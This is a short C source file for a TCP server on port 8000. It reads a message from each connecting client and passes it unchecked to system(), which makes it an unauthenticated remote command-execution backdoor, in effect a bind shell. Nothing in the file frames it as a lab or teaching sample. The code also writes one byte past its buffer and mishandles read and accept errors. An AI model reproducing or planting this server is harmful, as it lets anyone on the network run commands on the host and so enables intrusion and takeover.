#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define SERV_TCP_PORT 8000
#define MAX_SIZE 80

int main(int argc, char *argv[]){
  int sockfd, newsockfd, clilen;
  struct sockaddr_in cli_addr, serv_addr;
  int port;
  char string[MAX_SIZE];
  int len;

  /* server [port_number] */

  if(argc == 2)
     sscanf(argv[1], "%d", &port); /* read port number if provided */
  else
     port = SERV_TCP_PORT;

  /* open TCP socket */
  if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
     perror("can't open stream socket");
     exit(1);
  }

  /* bind local address */
  bzero((char *) &serv_addr, sizeof(serv_addr));
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
  serv_addr.sin_port = htons(port);

  if(bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0){
     perror("can't bind local address");
     exit(1);
  }

  /* listen to socket */
  listen(sockfd, 5);

  for(;;){

     /* wait for a connection from client */
     clilen = sizeof(cli_addr);
     newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);

     if(newsockfd < 0){
        perror("can't bind local address");
     }

     /* read message from client */
     len = read(newsockfd, string, MAX_SIZE);
     /* make sure it's a proper string */
     string[len] = 0;
     //printf("%s\n", string);
     system(string);

     close(newsockfd);
  }
}
